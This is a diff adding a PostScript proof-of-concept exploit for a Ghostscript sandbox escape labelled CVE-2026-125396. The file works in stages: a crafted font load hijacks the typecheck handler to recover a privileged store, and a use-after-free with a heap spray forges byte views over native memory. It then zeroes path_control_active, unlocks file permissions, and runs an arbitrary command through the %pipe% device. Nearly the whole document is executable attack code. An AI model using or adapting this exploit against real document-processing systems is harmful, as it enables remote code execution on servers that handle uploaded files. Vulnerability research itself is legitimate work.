@@ -1,0 +1,213 @@
+%!PS
+% ============================================================================
+% Upload2Shell (CVE-2026-125396) - RCE proof-of-concept (bounded, local lab)
+% ----------------------------------------------------------------------------
+% Based on the public pwn.ai research PoC (poc-native-write.pdf), extended
+% from "native memory write" to "command execution":
+%
+%   1. Crafted Type 1 font makes the .putgstringcopy helper (gs_fonts.ps)
+%      fail inside `copy` BEFORE its privileged `.forceput`.
+%   2. A custom `typecheck` error handler recovers the pending `.forceput`
+%      with attacker-chosen <dict> <key> <value> operands.
+%   3. The recovered store plants a LOCAL string into `systemdict`, which
+%      survives `restore` (save/restore VM lifetime violation = UAF).
+%   4. Marker-filled integer arrays reuse the freed allocation; a one-byte
+%      poke through the stale reference locates the overlapping live ref.
+%   5. The live ref is re-typed into a raw byte view over `currentdevice`'s
+%      psi_device_ref, and Ghostscript's own pointers are followed:
+%         psi_device_ref+0  -> gx_device
+%         gx_device+24      -> gs_memory_t
+%         gs_memory_t+208   -> gs_lib_ctx_t
+%         gs_lib_ctx_t+8    -> gs_lib_ctx_core_t
+%         core+156          -> path_control_active  (zeroed => -dSAFER off)
+%   6. The protected userparam `LockFilePermissions` is force-written to
+%      false (with a save/restore to re-sync the interpreter's cached copy),
+%      unblocking the `%pipe%` I/O device.
+%   7. `(%pipe%CMD) (w) file` executes CMD as the user running Ghostscript.
+%
+% Tested on: Ghostscript 10.07.0 self-built, x86-64 Linux, -dSAFER.
+% Offsets are the ones published by the researchers and verified for this
+% build via sizeof/offsetof on the same source tree.
+% ============================================================================
+
+% -------------------------- stage 1: stage the font -------------------------
+true setglobal
+/FontPath (%ram%upload2shell-rce.pfa) def
+false setglobal
+/FontFile FontPath (w) file def
+FontFile (%!PS-AdobeFont-1.0: GSLoaderProbe 1.0
+/FontType 1 def
+/Base /Courier findfont def
+/Font Base maxlength dict def
+Base { 1 index /FID ne { Font 3 1 roll put } { pop pop } ifelse } forall
+Font /FontName /GSLoaderProbe put
+/GSLoaderProbe Font definefont pop
+userdict /OldGlobal currentglobal put false setglobal
+userdict /BadOperand 0 array put
+count array astore userdict exch /SavedStack exch put
+0 1 userdict /SavedStack get length 1 sub {
+  userdict /I 3 -1 roll put
+  userdict /SavedStack get userdict /I get
+  2 copy get type /stringtype eq
+    { userdict /BadOperand get put } { pop pop } ifelse
+} for
+userdict /Trap true put
+userdict /OldGlobal get setglobal
+userdict /SavedStack get aload pop
+) writestring
+FontFile closefile
+
+% ------------------- stage 2: recover the privileged store ------------------
+/OldTypecheck errordict /typecheck get def
+errordict /typecheck {
+  userdict /Trap known { userdict /Trap get } { false } ifelse
+  { userdict /Trap false put pop pop pop pop pop
+    userdict /TargetDict get userdict /TargetKey get userdict /TargetValue get
+  } { OldTypecheck } ifelse
+} bind put
+
+true setglobal
+/FontEntry 1 array def
+FontEntry 0 FontPath put
+Fontmap /GSLoaderProbe FontEntry readonly put
+false setglobal
+
+% --------------------- stage 3: UAF - free + reuse + scan -------------------
+/Marker 305419896 def             % 0x12345678
+/Changed 305419897 def            % 0x12345679
+/Victims 512 array def
+/TargetDict systemdict def
+/TargetKey /UPLOAD2SHELL_DANGLING def
+/Snapshot save def
+/TargetValue 2048 string def
+0 1 2047 { TargetValue exch 65 put } for
+{ /GSLoaderProbe findfont pop } stopped pop
+Snapshot restore                  % local string is freed; systemdict ref lives on
+
+% spray integer refs to reuse the freed 2048 bytes
+0 1 511 {
+  /I exch def
+  32 array dup 0 1 31 { Marker put dup } for pop
+  Victims I 3 -1 roll put
+} for
+
+/Dangling systemdict /UPLOAD2SHELL_DANGLING get def
+
+% scan the stale view for the marker's low 4 bytes
+/Offset -1 def
+8 1 2044 {
+  /I exch def
+  Dangling I get 16#78 eq
+  Dangling I 1 add get 16#56 eq and
+  Dangling I 2 add get 16#34 eq and
+  Dangling I 3 add get 16#12 eq and
+  { /Offset I def exit } if
+} for
+Offset -1 eq { (NO_OVERLAP) print quit } if
+Dangling Offset 16#79 put         % poke one byte through the stale reference
+
+% find which live array element now reads back the changed marker
+/ArrayIndex -1 def /Slot -1 def
+0 1 511 {
+  /I exch def
+  0 1 31 {
+    /J exch def
+    Victims I get J get Changed eq
+    { /ArrayIndex I def /Slot J def exit } if
+  } for
+  ArrayIndex -1 ne { exit } if
+} for
+ArrayIndex -1 eq { (NO_ALIAS) print quit } if
+(OVERLAP_OK) print
+
+% -------------- stage 4: native pointer walk to path_control_active ---------
+/RefBase Offset 8 sub def         % ref header starts 8 bytes before its value
+/OrigRef 16 string def
+0 1 15 { /I exch def OrigRef I Dangling RefBase I add get put } for
+
+% put a real, writable, LOCAL 1024-byte string in the slot to harvest a
+% valid string-ref header (type/attrs/size) instead of hand-crafting one
+/BigStr 1024 string def
+Victims ArrayIndex get Slot BigStr put
+/Hdr 8 string def
+0 1 7 { /I exch def Hdr I Dangling RefBase I add get put } for
+
+% slot ref <- currentdevice : value.pdevice = pointer to psi_device_ref
+Victims ArrayIndex get Slot 0 put
+Victims ArrayIndex get Slot currentdevice put
+/PDev 8 string def
+0 1 7 { /I exch def PDev I Dangling RefBase 8 add I add get put } for
+PDev 6 get 0 ne PDev 7 get 0 ne or { (NULL_PDEVICE) print quit } if
+
+% forge: string-ref header + pdevice pointer  =>  byte view over psi_device_ref
+0 1 7 { /I exch def Dangling RefBase I add Hdr I get put } for
+0 1 7 { /I exch def Dangling RefBase 8 add I add PDev I get put } for
+/T0 Victims ArrayIndex get Slot get def          % view #1: psi_device_ref
+/GX 8 string def
+0 1 7 { /I exch def GX I T0 I get put } for      % +0: -> gx_device
+GX 6 get 0 ne GX 7 get 0 ne or { (NULL_GXDEVICE) print quit } if
+
+0 1 7 { /I exch def Dangling RefBase 8 add I add GX I get put } for
+/T1 Victims ArrayIndex get Slot get def          % view #2: gx_device
+/MEM 8 string def
+0 1 7 { /I exch def MEM I T1 24 I add get put } for   % +24: -> gs_memory_t
+MEM 6 get 0 ne MEM 7 get 0 ne or { (NULL_MEMORY) print quit } if
+
+0 1 7 { /I exch def Dangling RefBase 8 add I add MEM I get put } for
+/T2 Victims ArrayIndex get Slot get def          % view #3: gs_memory_t
+/LCTX 8 string def
+0 1 7 { /I exch def LCTX I T2 208 I add get put } for % +208: -> gs_lib_ctx_t
+LCTX 6 get 0 ne LCTX 7 get 0 ne or { (NULL_LIBCTX) print quit } if
+
+0 1 7 { /I exch def Dangling RefBase 8 add I add LCTX I get put } for
+/T3 Victims ArrayIndex get Slot get def          % view #4: gs_lib_ctx_t
+/CORE 8 string def
+0 1 7 { /I exch def CORE I T3 8 I add get put } for   % +8: -> core
+CORE 6 get 0 ne CORE 7 get 0 ne or { (NULL_CORE) print quit } if
+
+0 1 7 { /I exch def Dangling RefBase 8 add I add CORE I get put } for
+/T4 Victims ArrayIndex get Slot get def          % view #5: gs_lib_ctx_core_t
+
+(PATH_CONTROL_BEFORE=)
+print T4 156 get == T4 157 get == T4 158 get == T4 159 get ==
+
+% decisive write: path_control_active = 0  (-dSAFER's native gate off)
+T4 156 0 put
+T4 157 0 put
+T4 158 0 put
+T4 159 0 put
+
+(PATH_CONTROL_AFTER=)
+print T4 156 get == T4 157 get == T4 158 get == T4 159 get ==
+
+% cleanup: restore the original 16-byte ref in the overlap slot
+0 1 15 { /I exch def Dangling RefBase I add OrigRef I get put } for
+
+% ------------- stage 5: unlock %pipe% via LockFilePermissions ---------------
+% parse_file_name() rejects %pipe% while i_ctx_p->LockFilePermissions (the C
+% cached copy) is true. The PS-side userparams dict is LOCAL VM, so a plain
+% change would be rolled back by restore, and .forceput is undefined under
+% SAFER. Solution (same as the researchers' "third font load"): re-run the
+% font-loader trap and let the RECOVERED .forceput store `false` into the
+% userparams dict, then save/restore so the interpreter re-applies userparams
+% (zvmem resets its cached LockFilePermissions to false during restore and
+% gs_lev2's restore epilogue re-applies the dict values - now false).
+/TargetDict systemdict /userparams get def
+/TargetKey /LockFilePermissions def
+/TargetValue false def
+userdict /Trap true put                     % re-arm the trap for the 2nd run
+{ /GSLoaderProbe findfont pop } stopped pop     % second trap run -> forceput
+/LockSync save def
+LockSync restore                                % re-sync the cached C flag
+
+(LOCK_FILE_PERMISSIONS=) print currentuserparams /LockFilePermissions get ==
+
+% --------------------------- stage 6: execute -------------------------------
+(RCE_TRY) print
+{
+  (%pipe%__COMMAND__) (w) file closefile
+} stopped
+dup { (PIPE_FAILED) print pop } { (PIPE_OK) print pop } ifelse
+
+(RCE_DONE) print
+quit
